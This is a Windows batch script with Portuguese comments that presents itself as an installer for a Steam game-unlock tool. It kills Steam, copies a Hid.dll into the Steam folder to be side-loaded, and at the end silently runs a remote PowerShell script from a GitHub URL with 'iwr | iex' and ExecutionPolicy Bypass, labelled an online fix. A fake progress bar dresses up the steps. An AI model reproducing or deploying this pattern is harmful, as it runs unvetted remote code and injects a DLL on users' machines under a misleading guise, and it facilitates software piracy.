@echo off
setlocal EnableDelayedExpansion
:: Força o BAT a trabalhar na pasta onde ele está
cd /d "%~dp0"
chcp 65001 >nul
title Instalador SNYX
mode con: cols=100 lines=30

:: =====================================================
:: CONFIGURAÇÕES INTERNAS
:: =====================================================
set "ARQUIVO_ZIP=Pmw games unlock.zip"
set "URL_FIX=https://raw.githubusercontent.com/KRAYz-Oficial/KRAYz-Oficial/67065f398be63e1fe2c29ef2838f3030490eb3b6/Remover-bugs.ps1"

:: 1. VERIFICAÇÃO DE INTEGRIDADE
if not exist "%ARQUIVO_ZIP%" (
    cls
    color 0C
    echo.
    echo  [ERRO CRITICO] O arquivo "%ARQUIVO_ZIP%" não foi encontrado.
    pause
    exit
)

:: 2. DETECTAR CAMINHO DA STEAM
cls
echo.
echo  [INFO] Buscando diretório da Steam...
for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do (
    set "steamExe=%%A %%B"
)

if not defined steamExe (
    color 0C
    echo [ERRO] Steam não encontrada.
    pause
    exit
)

for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
set "steamDir=%steamDir:~0,-1%"
set "configDir=%steamDir%\config"

:: 3. INSTALAÇÃO
color 0A
echo.
echo  [OK] Preparando instalacao...
timeout /t 2 >nul

call :BarraProgresso

echo  [-] Encerrando Steam...
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"

echo  [+] Extraindo arquivos...
if exist "%temp%\pmw_temp" rmdir /s /q "%temp%\pmw_temp"
powershell -Command "Expand-Archive -Path '%ARQUIVO_ZIP%' -DestinationPath '%temp%\pmw_temp' -Force"

echo  [+] Copiando configuracoes...
xcopy /e /i /y "%temp%\pmw_temp\Config\*" "%configDir%\" >nul
copy /y "%temp%\pmw_temp\Hid.dll" "%steamDir%\" >nul
rmdir /s /q "%temp%\pmw_temp" >nul

echo  [+] Reiniciando Steam...
start "" "%steamExe%"

:: 4. FINALIZAÇÃO
echo  [+] Executando correção online...
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb '%URL_FIX%' | iex"

cls
echo.
echo ========================================================
echo         INSTALACAO FINALIZADA COM SUCESSO!
echo ========================================================
echo.
echo Esta janela fechara sozinha em 3 segundos...
timeout /t 3 >nul
exit

:BarraProgresso
cls
echo.
echo  [####################] 100%%
timeout /t 1 /nobreak >nul
goto :eof
